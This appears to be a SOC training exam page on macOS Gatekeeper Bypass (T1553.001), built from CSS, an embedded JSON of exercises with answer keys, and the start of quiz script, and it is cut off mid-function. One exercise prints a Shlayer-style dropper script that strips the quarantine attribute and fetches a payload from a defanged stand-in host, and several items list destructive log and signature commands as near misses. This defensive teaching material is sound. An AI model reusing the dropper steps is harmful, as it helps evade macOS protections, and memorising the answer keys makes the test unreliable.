.paused-overlay{position:fixed;inset:0;z-index:100;background:var(--bg-page);display:flex;align-items:center;justify-content:center;padding:20px}
.paused-card{background:var(--bg-surface);border:1px solid var(--state-paused);border-radius:var(--radius);box-shadow:var(--shadow);padding:28px 30px;max-width:440px;text-align:center}
.paused-card .pico{font-size:34px;color:var(--state-paused)}
.paused-card h2{margin:10px 0 6px;font-size:19px;color:var(--state-paused)}
.paused-card p{margin:0 0 18px;color:var(--text-secondary);font-size:14.5px}
/* ---------- responsive ---------- */
@media (max-width:760px){
  .dnd{grid-template-columns:1fr}
  .matchrow{grid-template-columns:1fr}
  .intro{padding:16px 12px 40px}
  .stage{padding:14px 10px 48px}
  .hdr{padding:8px 10px}
  .fact{font-size:12.5px}
}
@media (prefers-reduced-motion: reduce){
  .progress-fill{transition:none}
  .progress-fill::after{animation:none;display:none}
  .btn,.opt,.bankitem,.order-btns button,.zone,.match-sel{transition:none}
  *{scroll-behavior:auto!important}
}

<script type="application/json" id="exam-data">{"topicId":"t1553.001","batch":3,"difficulty":"hard","severity":"HARD","passMark":70,"estimatedMinutes":35,"mitreId":"T1553.001","mitreName":"Gatekeeper Bypass","objectType":"Sub-Technique","intro":{"learn":["This exam is the HARD level for the MITRE ATT&CK sub-technique T1553.001, Gatekeeper Bypass, a Sub-Technique of T1553 in the Defense Evasion tactic. Every exercise chains two or three ideas: a signature state changes what a verdict means, a log gap changes what a timeline can prove.","The scenarios come from real SOC and IR work on macOS fleets: tickets with confusing evidence, endpoints security telemetry, unified log windows, and MDM records that disagree with what you see on disk. They also use documented tradecraft of real macOS threat families — Shlayer and Bundlore — who distribute tainted DMGs and clear the quarantine attribute before launching anything.","You will use these skills as a SOC analyst deciding whether an alert is a bypass or a protection, as an incident responder preserving evidence under pressure, as a detection engineer writing rules on the right events, as a Mac administrator keeping the MDM policy honest, and as a threat hunter scoping a campaign across hosts.","Expect distractors that are almost right. The obvious answer is wrong in several exercises, because the artefacts change what the textbook answer means. Read the artefacts before you read the options."],"keywords":[{"theme":"Verdicts and signatures","items":["spctl accepted and rejected sources","codesign verification depth","notarization limits","Developer ID signing and notarization gaps"]},{"theme":"Bypass tradecraft","items":["Shlayer tainted DMG staging","quarantine removal in dropper scripts","least-aggressive containment"]},{"theme":"Detection and response","items":["unified log predicate hunting","ESF process and file events","evidence-preserving triage","policy drift findings"]}],"how":["You will answer 15 exercises and you need 70% or more to pass.","Exercise types in this exam: single choice, multi-select, matching pairs, ordering steps, priority ranking, fill-in-the-blank, drag-and-drop sorting, one branching scenario, and two terminal exercises in a fake shell. The two terminals are graded element by element.","A countdown timer runs for 35 minutes. Pause hides the exercise and stops the timer until you press Resume.","When you press Check, the timer stops automatically so you can read the feedback. It starts again on Next.","Exercises with several items give partial credit: max(0, (correct − wrong) / items). One hint per exercise is allowed; it costs 10% of that exercise's credit. Hints remove one wrong path — they do not name the answer.","Skip moves an exercise to a review pool near the end. Skipped exercises you never answer do not count in your score at all."]},"exercises":[{"id":"e01","type":"single","perspective":"defender","scenario":{"summary":"App runs from a random /private/var path — is that compromise?","text":["INC-3341: a designer on MAC-DES-17 reports that a downloaded tool, PixelSizer.app, opened from a long randomized path under /private/var/folders/…/AppTranslocation/… and cannot save its settings.","The user is convinced the folder is where malware hides and asks for the Mac to be isolated. The Mac is managed: the MDM locks the Gatekeeper policy, and the app still carries the com.apple.quarantine attribute.","The shift lead wants your read of the artefact before anyone touches the host."],"artefacts":[{"label":"ARTEFACT 1 — Ticket INC-3341 excerpt","kind":"ticket","lines":["User: designer, MAC-DES-17. App: PixelSizer.app, downloaded today.","Reported path: /private/var/folders/…/AppTranslocation/… (changes on every launch).","User asks for the Mac to be isolated.","First launch showed the normal un-notarized-download warning, which the user clicked through."]},{"label":"ARTEFACT 2 — Attribute and policy state","kind":"code","lines":["ls -l@ PixelSizer.app → com.apple.quarantine present","spctl --status → assessments enabled","MDM: GatekeeperLevel = IdentifiedDevelopers (locked)"]}]},"question":"What does the AppTranslocation path most likely indicate here?","options":[{"id":"a","text":"Malware relocated itself to evade scanning — isolate the designer's host now"},{"id":"b","text":"macOS moved the quarantined app to a read-only randomized path — a protection, not an attack"},{"id":"c","text":"The app was installed into /Applications and the random path is only cosmetic"},{"id":"d","text":"SIP was disabled on the Mac, so macOS no longer controls where apps launch from"}],"correct":["b"],"hint":"The policy is locked and the attribute is still present; choose the reading that survives both facts.","explain":["Translocation is the defense, not the attack: a quarantined, unapproved app launched in place gets copied to a randomized read-only path. The locked policy and the intact attribute both fit that reading.","Isolating the host treats a protection as a compromise. An /Applications install would not produce this path, and nothing here suggests SIP is off — the other three options fail on the artefacts."]},{"id":"e02","type":"order","perspective":"attacker","scenario":{"summary":"Reconstructed Shlayer-style staging run","text":["You are replaying a captured campaign in the malware lab for the quarterly ATT&CK mapping (ticket MAL-088). The family behaves like Shlayer: it distributes tainted DMGs disguised as a Flash Player update, stages payloads, and clears the quarantine attribute before launch.","The six events below arrived shuffled; the recovered dropper script is attached. Order the attacker's steps."],"artefacts":[{"label":"ARTEFACT 1 — Recovered dropper script (staging stage)","kind":"code","lines":["#!/bin/zsh","hdiutil attach /tmp/FlashUpdate.dmg","cp -R '/Volumes/FlashUpdate/FlashUpdate.app' /tmp/stage/","xattr -d com.apple.quarantine '/tmp/stage/FlashUpdate.app'","open '/tmp/stage/FlashUpdate.app'","curl -s hxxp://cdn-upd[.]example[.]com/p -o /tmp/stage/payload.bin"]},{"label":"ARTEFACT 2 — Ticket MAL-088 note","kind":"ticket","lines":["Campaign profile matches Shlayer: tainted DMGs posed as Flash Player updates.","Family behaviour: stage payloads, clear quarantine attributes, launch unassessed, repack per wave."]}]},"question":"Put the attacker's steps in the correct order.","steps":["Serve a fake “Flash Player update” DMG from a poisoned download page","The user mounts the DMG and runs the copied installer app","The dropper copies payloads into a staging folder","The dropper clears com.apple.quarantine from the staged payloads","The staged app launches with no first-launch assessment and pulls an extra payload","Fresh tainted DMG copies are repacked for the next victims"],"hint":"The sample script shows the middle of the chain; the DMG must exist before mounting, and the repack happens after the run.","explain":["The chain starts with distribution: the tainted DMG must be on the victim's disk before anything can be mounted or staged. Mounting and running the installer then delivers the dropper.","Inside the host, the script copies payloads to the staging folder, strips the quarantine attribute — the T1553.001 step — and only then launches the app, which now runs with no assessment and fetches the extra payload. The repack for new victims is the final, outbound step."]},{"id":"e03","type":"terminal","perspective":"defender","scenario":{"summary":"Prove the signature state of the lab sample for INC-3512","text":["INC-3512: the sample FlashUpdate.app from the lab DMG sits at /Users/ir/Desktop/Samples/FlashUpdate.app on the isolated analysis Mac.","The IR lead wants one line in the ticket that proves whether the bundle's own signature is intact — including any nested helpers — with verbose detail she can quote.","You have a shell on the analysis host. The sample volume is mounted read-only, and the ticket template says: verify, never modify."],"artefacts":[{"label":"ARTEFACT 1 — Ticket INC-3512 template line","kind":"ticket","lines":["Required record: signature state of /Users/ir/Desktop/Samples/FlashUpdate.app — verified recursively, verbose, no modification."]},{"label":"ARTEFACT 2 — Sample listing","kind":"code","lines":["ls -l@ /Users/ir/Desktop/Samples/FlashUpdate.app → com.apple.quarantine present","Bundle contains: MacOS/FlashUpdate, Frameworks/Updater.app (nested helper)"]}]},"question":"Type the command that produces the proof the template wants.","terminal":{"prompt":"ir@mac-lab-04","banner":["malware-lab sandbox — INC-3512 — sample mounted read-only","no network; nothing here executes the sample"],"solution":"codesign --verify --deep -v /Users/ir/Desktop/Samples/FlashUpdate.app","elements":[{"label":"uses the signature-verification tool","re":"^codesign( |$)"},{"label":"verify mode only (no state change)","re":"(^|\\s)--verify( |$)"},{"label":"recurses into nested helpers (--deep)","re":"(^|\\s)--deep( |$)"},{"label":"verbose detail for the ticket (-v)","re":"(^|\\s)-v( |$)"},{"label":"targets the lab sample path","re":"FlashUpdate\\.app"}],"outputs":[{"re":"^codesign","lines":["/Users/ir/Desktop/Samples/FlashUpdate.app: code object is not signed at all","In architecture: x86_64"]}],"nearMiss":[{"re":"codesign\\s+(-f|--force)","msg":"Force-signing (codesign -f -s) overwrites the original signature — the tamper evidence for the IR report would be destroyed"},{"re":"^xattr\\s+(-d|-rc)","msg":"Stripping or clearing quarantine attributes on the sample destroys first-launch evidence on a live case"}],"nearMissSample":"codesign -f -s TeamABC123 /Users/ir/Desktop/Samples/FlashUpdate.app","partialSample":"codesign --verify /Users/ir/Desktop/Samples/FlashUpdate.app","hint":"The template wants verification with recursion and detail — and nothing that writes.","explain":["codesign --verify checks the bundle's signature without changing anything, --deep walks the nested helpers inside the app, and -v prints the verbose detail the lead asked to quote.","The command is graded element by element. Leaving out --deep and -v still verifies the outer bundle but misses nested helpers — that is the partial path. The near misses are destructive: -f -s re-signs the sample and overwrites the original signature, and any xattr deletion or recursive clear taints the evidence."]},"hint":"The ticket wants proof about the nested helpers too, and nothing may write.","explain":["The canonical command is codesign --verify --deep -v /Users/ir/Desktop/Samples/FlashUpdate.app: verification mode, recursion into nested code, verbose output, on the sample path.","Force-signing would rewrite the one thing the ticket needs to prove, and attribute clearing would destroy the quarantine state — both are flagged as dangerous near misses, not as valid answers."]},{"id":"e04","type":"match","perspective":"defender","scenario":{"summary":"Verdict cheat-sheet cross-check before the runbook ships","text":["Before the Mac runbook is published, a junior analyst's verdict table needs cross-checking. One row was copy-pasted from the wrong tool and one row is subtly wrong.","Fix the mapping now; the runbook ships tonight."],"artefacts":[{"label":"ARTEFACT 1 — Runbook ticket RUNB-77 note","kind":"ticket","lines":["Scope: verdict lines from spctl, codesign, unified log, and ls -l@.","Rule: every row must state what the line proves — no tool guesses."]},{"label":"ARTEFACT 2 — The row under suspicion","kind":"ticket","lines":["Junior's draft row mixes a policy verdict with a certificate state.","Editor's note: one row was copy-pasted from the wrong tool."]}]},"question":"Match each line to what it proves.","pairs":[{"left":"spctl -a: accepted, source=Notarized Developer ID","right":"App passes with a stapled notarization"},{"left":"spctl -a: rejected, source=no usable signature","right":"App fails the assessment; effectively unsigned"},{"left":"codesign: CSSMERR_TP_CERT_EXPIRED","right":"Signature present but the signing certificate expired"},{"left":"unified log: Gatekeeper declined the launch","right":"The first-launch assessment blocked the app"},{"left":"ls -l@: com.apple.quarantine absent after a download","right":"Someone or something removed the quarantine flag"}],"hint":"Grade each row on what its own line proves — two rows come from the same tool and must not be merged.","explain":["The two spctl rows are policy verdicts: accepted with a notarized source means the app passed with a stapled ticket; rejected with no usable signature means the assessment failed because there is effectively nothing to trust.","The CSSMERR row is a signature state — the bundle is signed but the certificate has expired, which is different from being unsigned. The log row records the block itself, and the ls -l@ row is the quiet one: a downloaded app with no quarantine attribute means the flag was removed, which is the T1553.001 signature to escalate."]},{"id":"e05","type":"multi","perspective":"defender","scenario":{"summary":"What belongs in the T1553.001 detection rule","text":["Detection engineering is drafting the macOS rule pack for T1553.001, and the first review is tomorrow.","The telemetry you already collect covers the unified log, Endpoint Security Framework exec and file events, process monitoring on user sessions, and the MDM inventory.","The rule must fire on the technique's own steps and stay quiet on healthy Mac behaviour, because the fleet forwards thousands of routine events per hour.","Last quarter's noisy rule was tuned into silence within a week, so the team is careful about what qualifies.","Three of the five candidate artefacts belong in the rule; two describe normal, expected activity.","Each selected artefact must map to a step a bypass cannot skip.","Each rejected one must be defensible to the platform owner who reads the alert queue.","Choose the three that survive that test."]},"question":"Select the THREE artefacts that belong in a detection rule for T1553.001 activity.","options":[{"id":"a","text":"Process events where xattr deletes com.apple.quarantine in a user session"},{"id":"b","text":"Execution of spctl --master-disable on a managed host"},{"id":"c","text":"A notarized app launching from /Applications after a normal install"},{"id":"d","text":"A downloaded app launching with no Gatekeeper assessment record in the unified log"},{"id":"e","text":"Weekly App Store app refreshes on managed Macs"}],"correct":["a","b","d"],"hint":"Rule out the two options that describe healthy, expected Mac behaviour.","explain":["The three selected artefacts are the technique's own events: an xattr deletion of the quarantine flag in a user session, an attempt to turn assessments off entirely, and the resulting launch with no assessment record. Each maps to a step a bypass must take.","A notarized app launching from /Applications is the normal install path, and App Store refreshes are routine management traffic — neither belongs in a bypass rule, and both would flood the alert queue with false positives."]},{"id":"e06","type":"drag","perspective":"defender","scenario":{"summary":"Morning triage: six Mac findings, three lanes","text":["You inherit the night shift's queue: six findings from the Mac fleet. Sort each one so the day shift works the right lane.","One lane is benign macOS behaviour, one is the bypass technique, one is configuration drift for the platform team."],"artefacts":[{"label":"ARTEFACT 1 — Night-shift queue export (filter to find a lane)","kind":"log","filter":true,"lines":["finding-1 MAC-DES-17 quarantined app sighted under AppTranslocation path","finding-2 MAC-HR-03 downloaded app launched, no assessment record in log","finding-3 MAC-SUP-05 user-session zsh ran xattr -d com.apple.quarantine","finding-4 MAC-FIN-02 notarized vendor update launched from /Applications","finding-5 MAC-LAB-02 spctl --status reports assessments disabled (managed host)","finding-6 MAC-OPS-11 standard user added to local admin group this week"]},{"label":"ARTEFACT 2 — Handover note, ticket QUEUE-441","kind":"ticket","lines":["Six findings exported from the night queue; lanes undecided.","Lead's rule: benign stays unworked, bypass pages IR, drift routes to the Mac platform team."]}]},"question":"Sort each finding into the correct lane.","zones":[{"id":"z1","label":"Benign — expected macOS behaviour","accepts":["i1","i4"]},{"id":"z2","label":"Bypass indicator — investigate today","accepts":["i2","i3"]},{"id":"z3","label":"Policy drift — route to Mac admins","accepts":["i5","i6"]}],"items":[{"id":"i1","text":"Quarantined un-notarized app sighted under an AppTranslocation path"},{"id":"i2","text":"Downloaded app launched with no assessment record in the unified log"},{"id":"i3","text":"User-session zsh ran xattr -d com.apple.quarantine on a fresh download"},{"id":"i4","text":"Notarized vendor update launched from /Applications with a stapled ticket"},{"id":"i5","text":"spctl --status reports assessments disabled on a managed Mac"},{"id":"i6","text":"A standard user was added to the local admin group this week"}],"hint":"One lane is protection, one lane is the technique, one lane is configuration the platform team owns.","explain":["The AppTranslocation sighting and the notarized update from /Applications are macOS working as designed — protection and normal install, not attack.","The launch with no assessment record and the user-session xattr deletion are the technique's own footprints, so they go to the bypass lane and get investigated today. Assessments disabled on a managed host and an unexpected admin promotion are configuration drift: alarming for policy, but owned by the Mac platform team, not the IR lane."]},{"id":"e07","type":"blank","perspective":"defender","scenario":{"summary":"Fix the misnamed term before the register ships","text":["INC-3847 closed with a confirmed quarantine-strip on MAC-DES-17, and the monthly risk register entry is due tonight.","The drafter's sentence is already in the register draft — but the reviewer flagged one misnamed term: the case artefacts contradict it.","Artefact 1 is the draft sentence; artefacts 2 and 3 are the case evidence it must match.","Type the word that corrects the misnamed term, exactly; the register rejects paraphrases."],"artefacts":[{"label":"ARTEFACT 1 — Register draft, entry INC-3847","kind":"ticket","lines":["The activity on MAC-DES-17 is mapped to T1553.001, Gatekeeper Translocation: the dropper removed the com.apple.quarantine attribute before first launch, and the recommended control is to lock the Gatekeeper policy with MDM."]},{"label":"ARTEFACT 2 — ESF slice, MAC-DES-17","kind":"log","filter":true,"lines":["10:12:40 procmon: /bin/zsh -c xattr -d com.apple.quarantine /Users/des17/Downloads/PixelSizer.app","10:12:58 launchd: PixelSizer.app exec — no assessment record in window"]},{"label":"ARTEFACT 3 — Triage note, same host","kind":"text","lines":["09:58 AppTranslocation sighting on MAC-DES-17: checked, expected behaviour — quarantined app launched in place, unrelated to INC-3847."]}]},"question":"Type the word that corrects the misnamed term in the draft.","blanks":[{"before":"Corrected entry: the activity on MAC-DES-17 is mapped to T1553.001, Gatekeeper ","answer":["bypass"],"after":", because the dropper removed the attribute rather than relocating the app.","hint":"the artefacts show a removal, not a relocation"}],"hint":"The draft's term names a protection the artefacts ruled out; the evidence shows an attribute being removed.","explain":["The artefacts decide the correction: ESF shows a shell removing com.apple.quarantine and a launch with no assessment record — that is the removal technique, Gatekeeper Bypass, not App Translocation. The draft's term was pulled from the 09:58 sighting, which triage already closed as expected behaviour unrelated to this incident.","The correction matters because the register drives control spending: a Translocation misname would fund a non-fix, while the Bypass entry keeps the MDM lock and the removal-pattern hunt attached to the right technique. The rest of the sentence already matches the artefacts, so only the one term changes."]},{"id":"e08","type":"branch","perspective":"defender","scenario":{"summary":"DiskTune.app opened with no warning — INC-3902","text":["INC-3902, MAC-HR-03: a user reports that DiskTune.app, downloaded from a software-collection site (hxxp://utilhub[.]example/dl), opened with no warning.","The user says the machine felt slow and a forum post recommended the tool.","spctl -a -vv on the recovered sample says: rejected, source=Unnotarized Developer ID.","The app's quarantine attribute is missing, and ESF shows /bin/zsh -c xattr -d com.apple.quarantine /Users/hr3/Downloads/DiskTune.app four seconds after the download finished.","The user says they never opened a terminal, and no other host has reported the hash yet.","The on-call lead needs two decisions tonight, and the ticket must end with an immediate-action line.","Budget for the night: one responder, no change windows.","Work the branch."],"artefacts":[{"label":"ARTEFACT 1 — spctl on the recovered sample","kind":"code","lines":["/Users/hr3/Downloads/DiskTune.app: rejected","source=Unnotarized Developer ID"]}]},"question":"Work the branch to the immediate-action line.","branch":{"steps":[{"prompt":"Given the missing attribute and the zsh removal event, what changed on this host?","options":[{"id":"a","text":"Nothing — rejected apps launch silently when they are signed"},{"id":"b","text":"An active step removed the flag, so the first-launch assessment was skipped"},{"id":"c","text":"The fleet Gatekeeper policy was downgraded to Anywhere"}],"correct":"b","outcome":"You record: bypass step confirmed at 10:14:07, one host so far."},{"prompt":"The on-call lead asks how to respond tonight. The app is unnotarized; no other hosts show the hash yet.","options":[{"id":"a","text":"Reimage MAC-HR-03 immediately and restore from yesterday's backup"},{"id":"b","text":"Contain the host, collect the app, the script, and a log export, then remove the bundle"},{"id":"c","text":"Wait for more hosts to appear before touching anything"}],"correct":"b","outcome":"The lead approves the containment plan; evidence is captured before removal."}],"final":{"question":"What goes in the ticket's immediate-action line?","options":[{"id":"a","text":"Confirmed T1553.001 bypass on one host; contained and evidence captured; fleet hunt queued"},{"id":"b","text":"Nothing to do — the app was rejected by Gatekeeper, so it never ran"},{"id":"c","text":"Fleet-wide reimage approved because one host showed a bypass"}],"correct":["a"]}},"hint":"Two extremes are on the table; the middle course still preserves evidence.","explain":["The removal event, not the rejected verdict, defines the incident: Gatekeeper would have blocked the app, so the attacker's script removed the trigger — a textbook T1553.001 step.","Reimaging immediately destroys volatile evidence for a single confirmed host, and waiting leaves an active bypass in place. Containment with evidence capture, then removal, then a fleet hunt, is the least aggressive response that still acts — and it is what the ticket records."]},{"id":"e09","type":"terminal","perspective":"defender","scenario":{"summary":"Pull the quarantine records for the report appendix","text":["INC-3512 follow-up: the IR lead needs every unified log record that mentions quarantine activity in the three hours around the incident, for the report appendix.","You are on the isolated analysis Mac as ir, the clock is NTP-synced, and the appendix template says: one command, three-hour window, predicate quoting the exact word “quarantine”, output pasted verbatim."],"artefacts":[{"label":"ARTEFACT 1 — Appendix template, INC-3512","kind":"ticket","lines":["Appendix C requires: one command, three-hour window, predicate quoting the exact word “quarantine”, output pasted verbatim."]},{"label":"ARTEFACT 2 — Host notes","kind":"text","lines":["Analysis Mac clock: NTP-synced.","Log store: local, no forwarding; the appendix is compiled on this host."]}]},"question":"Type the command that fills the appendix template.","terminal":{"prompt":"ir@mac-lab-04","banner":["unified log store — read-only query session — INC-3512"],"solution":"log show --last 3h --predicate 'eventMessage CONTAINS \"quarantine\"'","elements":[{"label":"reads the unified log store","re":"^log show( |$)"},{"label":"limits the window to the incident period (--last 3h)","re":"(^|\\s)--last( |$)"},{"label":"filters with a predicate","re":"(^|\\s)--predicate( |$)"},{"label":"matches quarantine records","re":"quarantine"}],"outputs":[{"re":"^log show","lines":["2024-05-14T09:31:41+02:00 procmon[412]: /bin/zsh -c xattr -d com.apple.quarantine /Users/ir/Desktop/Samples/…","2024-05-14T09:32:02+02:00 syspolicyd[189]: assessment skipped: no quarantine attribute"]}],"nearMiss":[{"re":"log\\s+(erase|flush)","msg":"log erase and log flush destroy unified log data — the incident window would be gone before anyone can review it"}],"nearMissSample":"log erase all","partialSample":"log show --predicate 'quarantine'","hint":"Three things must appear: the reader, the window, and the exact match word.","explain":["log show reads the unified log store, --last 3h bounds the query to the incident window, and --predicate with the quoted word quarantine keeps only the records the appendix needs.","Dropping --last is the partial path: the predicate still works but the window is unbounded, which is not what the template demands. log erase or log flush would delete the very records the report needs — those are flagged as dangerous near misses."]},"hint":"Reader, window, match word — the template asks for all three in one line.","explain":["The canonical command is log show --last 3h --predicate 'eventMessage CONTAINS \"quarantine\"' — one command, bounded window, exact match word, output ready to paste.","It is graded element by element: the tool, the window option, the predicate, and the match word. Erasing or flushing the log store is a destructive near miss because it destroys the telemetry under investigation."]},{"id":"e10","type":"prioritize","perspective":"defender","scenario":{"summary":"Escalation steps after the INC-3902 confirmation","text":["INC-3902 is confirmed as a T1553.001 bypass on MAC-HR-03, and the lead asks you to order the six escalation steps before the stand-up.","The constraint from the IR manager is unchanged: evidence before removal, single host before fleet, hardening last.","Attribute state and log records are the volatile parts of the case.","Two of the steps destroy or alter state if they run early, and one step produces the indicators the others depend on.","The fleet hunt cannot run until its indicators are verified on the first host.","The MDM change request is durable, so it survives being last.","The stand-up starts in twenty minutes, and the lead wants the order, not a discussion.","Order the six escalation steps from first to last."]},"question":"Order the escalation steps from first to last.","steps":["Isolate MAC-HR-03 and preserve the mounted image and attribute state","Export the unified log slice from download to launch","Correlate the launch time with the missing assessment record","Hunt the fleet for the app hash, the download domain, and the xattr pattern","Remove the bundle and the dropper script from affected hosts","File the MDM change request to lock the Gatekeeper policy"],"hint":"Evidence before removal, single host before fleet, hardening last.","explain":["Isolation and the two evidence steps come first because attribute state and log records are volatile and cannot be recreated once the host is cleaned.","Correlation turns raw records into a timeline, the fleet hunt uses that timeline's indicators, removal clears what the hunt confirmed, and the MDM lock is the durable fix that comes after the firefight."]},{"id":"e11","type":"single","perspective":"defender","scenario":{"summary":"xattr alert on the build node at 02:14","text":["Alert at 02:14: “xattr -d com.apple.quarantine executed by user jenkins on MAC-BLD-01”.","The Mac is a managed build node with no interactive users and no user sessions at that hour.","Pipeline documentation says the stage “re-stage downloaded tool artifacts” removes quarantine flags inside the isolated builder session before packaging.","The same job has run weekly for months, and the stage's log shows the identical command each time.","The alert rule was written for user sessions on user Macs, not for builder accounts.","Four classifications are on the table, and only one survives the actor, the host role, and the pattern.","The duty manager wants a classification, not a discussion."]},"question":"What is the correct classification for the alert?","options":[{"id":"a","text":"Confirmed attacker bypass — escalate as a security incident"},{"id":"b","text":"Expected pipeline behaviour on the build node; tune the alert to exclude the builder service account"},{"id":"c","text":"Remove xattr from every Mac to stop the activity"},{"id":"d","text":"Reimage the build node before the next pipeline run"}],"correct":["b"],"hint":"Before judging the command, judge who ran it, where, and how often.","explain":["The actor, the host role, and the pattern matter more than the command string: a documented pipeline stage, running as a service account, on a host with no users, on a stable weekly schedule, is expected behaviour — the alarming-looking event is benign here.","Calling it an incident, banning xattr fleet-wide, or reimaging all punish a documented build step. The right action is an alert tuning that still catches the same command when it appears in a user session."]},{"id":"e12","type":"match","perspective":"defender","scenario":{"summary":"Signature states for the runbook table","text":["The Mac runbook's second table maps signature states to what Gatekeeper does with them.","One wrong row causes a wrong triage call later, so the platform owner asked for a second pass."],"artefacts":[{"label":"ARTEFACT 1 — Runbook ticket RUNB-77 note","kind":"ticket","lines":["Table 2 maps signature states to Gatekeeper consequences.","Editor's rule: each row states who vouched and what the default policy does."]},{"label":"ARTEFACT 2 — Sample rows from the review","kind":"code","lines":["spctl -a -vv Vendor.app → accepted, source=Notarized Developer ID","spctl -a -vv Tool.app → rejected, source=Unnotarized Developer ID"]}]},"question":"Match each signature state to its consequence.","pairs":[{"left":"Notarized with a stapled ticket","right":"Passes Gatekeeper even offline"},{"left":"Developer ID signed, not notarized","right":"Fails default policy; needs an override or a removed flag"},{"left":"Ad-hoc signature (no identity)","right":"Fine on the building Mac; fails Gatekeeper elsewhere"},{"left":"Broken signature after tampering","right":"Verification fails — the bundle changed after signing"}],"hint":"Ask each row: would the default policy accept it, and who vouched?","explain":["A stapled notarization ticket travels with the app, so the check works offline and the app passes the default policy.","Developer ID without notarization fails the default policy, which is exactly why attackers either abuse an override or remove the flag. An ad-hoc signature has no identity behind it, so it only works on the machine that built it, and a broken signature means the bundle was modified after signing — verification must fail."]},{"id":"e13","type":"drag","perspective":"defender","scenario":{"summary":"Live-host safety: what may you run right now?","text":["MAC-HR-03 is live and contained."],"artefacts":[{"label":"ARTEFACT 1 — Lead's rule, chat excerpt","kind":"ticket","lines":["MAC-HR-03 is live and contained.","Rule for tonight: read-only commands may run on the live host; anything that changes state waits for my approval."]},{"label":"ARTEFACT 2 — Containment status","kind":"text","lines":["Network: isolated at 22:41.","Evidence copies: DMG and app bundle hashed to evidence storage.","Approval queue: two change requests pending."]}]},"question":"Sort each command into the correct zone.","zones":[{"id":"z1","label":"Safe on the live host (read-only)","accepts":["i1","i2","i3"]},{"id":"z2","label":"State-changing — needs approval first","accepts":["i4","i5","i6"]}],"items":[{"id":"i1","text":"Export the unified log slice to evidence storage"},{"id":"i2","text":"Print each staged app's quarantine value with xattr -p"},{"id":"i3","text":"Run a verbose Gatekeeper assessment on a copied sample"},{"id":"i4","text":"Clear quarantine attributes from the Downloads folder with xattr -rc"},{"id":"i5","text":"Re-sign the broken sample with your own identity"},{"id":"i6","text":"Turn off Gatekeeper assessments while investigating"}],"hint":"Three commands only read; three commands rewrite security state or evidence.","explain":["Log export, xattr -p, and an assessment on a copy only read — they can run on the live host without tainting anything.","The recursive clear rewrites attributes across a folder tree, re-signing overwrites the signature you are investigating, and turning assessments off changes a fleet-visible security setting. All three destroy or alter the state you are supposed to preserve, so they wait for approval."]},{"id":"e14","type":"order","perspective":"dual","scenario":{"summary":"Hunt plan for the tainted DMG on MAC-SUP-05","text":["The night shift flagged a DMG named FlashUpdate.dmg on MAC-SUP-05, mounted at 21:03. The staging behaviour matches the Shlayer profile.","Build the hunt order for the day shift; the telemetry slice below is your starting point."],"artefacts":[{"label":"ARTEFACT 1 — MAC-SUP-05 telemetry slice","kind":"log","filter":true,"lines":["21:03:11 kernel: hfs: mounted /Volumes/FlashUpdate (from FlashUpdate.dmg)","21:03:26 procmon: /bin/zsh cp -R /Volumes/FlashUpdate/.helper /tmp/stage/","21:03:27 procmon: /bin/zsh xattr -d com.apple.quarantine /tmp/stage/.helper","21:04:01 launchd: /tmp/stage/.helper exec (no assessment record)","21:04:15 network: /bin/zsh GET hxxp://cdn-upd[.]example[.]com/p"]},{"label":"ARTEFACT 2 — Hunt ticket HUNT-12 note","kind":"ticket","lines":["Profile match: Shlayer-style staging.","Rule: block only after local evidence is captured; the fleet hunt runs on verified indicators."]}]},"question":"Put the hunt steps in the correct order.","steps":["Collect the DMG hash and the staged folder listing from the host","Check process telemetry for a shell clearing quarantine attributes","Correlate the launch time with the missing assessment record in the unified log","Extract the payload URL (hxxp://cdn-upd[.]example[.]com/p) and block it at the proxy","Hunt the fleet for the same DMG hash and sender domain"],"hint":"Local evidence first, then correlation, then blocking, then the fleet.","explain":["Attacker perspective: the DMG, the staging folder, the attribute clearing, and the payload URL are the attacker's chain — each step exists to keep the payload unassessed from download to launch.","Defender perspective: the hunt order collects evidence before blocking, so the analysis survives and the fleet search runs on verified indicators instead of guesses — hash and domain last, once they are confirmed."]},{"id":"e15","type":"multi","perspective":"defender","scenario":{"summary":"What would have stopped the chain earliest","text":["The post-incident review for the Shlayer-style campaign meets on Friday, and the first agenda item is prevention.","The chain ran end to end on one host: tainted DMG, staged payloads, attribute clearing, quiet launch, payload fetch.","Two measures would have stopped that chain earliest, and both must leave developer workflows intact.","The build team ships signed artifacts daily and mounts vendor DMGs weekly, so blanket blocks are off the table.","The user in the incident had local admin rights, which the removal step needed.","Each rejected measure must fail the no-workflow-breakage condition, not just be expensive.","The review will fund exactly the two selected measures this quarter.","Two of the four measures qualify. Choose them."]},"question":"Select the TWO measures that would have stopped the chain earliest without breaking workflows.","options":[{"id":"a","text":"MDM lock of the Gatekeeper policy plus no local admin rights for the user"},{"id":"b","text":"Alerting on xattr quarantine removal outside the approved build accounts"},{"id":"c","text":"Blocking every DMG mount on user Macs"},{"id":"d","text":"Requiring IT to manually re-sign every download"}],"correct":["a","b"],"hint":"Two options stop the technique; two options break how the business works.","explain":["The MDM lock plus removing local admin rights kills the technique at its root: the user cannot downgrade the policy and cannot run the removal commands that need elevated rights. The tuned alert catches the removal step the first time it happens outside sanctioned accounts.","Blocking every DMG mount breaks packaging, software distribution, and vendor updates, and manual re-signing of downloads does not scale and quietly creates a new trust problem — both fail the no-workflow-breakage condition."]}]}</script>
<script>
(function () {
  'use strict';

  /* ============================ utilities ============================ */
  function $(id) { return document.getElementById(id); }
  function esc(s) {
    return String(s).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }
  function mulberry32(seed) {
    var t = seed >>> 0;
    return function () {
      t += 0x6D2B79F5;
      var r = Math.imul(t ^ (t >>> 15), 1 | t);
      r ^= r + Math.imul(r ^ (r >>> 7), 61 | r);
      return ((r ^ (r >>> 14)) >>> 0) / 4294967296;
    };
  }
  function shuffled(arr, rnd) {
    var a = arr.slice(), i, j, tmp;
    for (i = a.length - 1; i > 0; i--) {
      j = Math.floor(rnd() * (i + 1));
      tmp = a[i]; a[i] = a[j]; a[j] = tmp;
    }
    return a;
  }
  function fmtClock(sec) {
    sec = Math.max(0, Math.round(sec));
    var m = Math.floor(sec / 60), s = sec % 60;
    return (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
  }
  function fmt1(n) { return (Math.round(n * 10) / 10).toFixed(1); }
  function fmt2(n) { return (Math.round(n * 100) / 100).toFixed(2); }
  function fmtPct(sum, count) { return count > 0 ? Math.round((sum / count) * 100) : 0; }
  function hashId(s) {
    var h = 0, i;
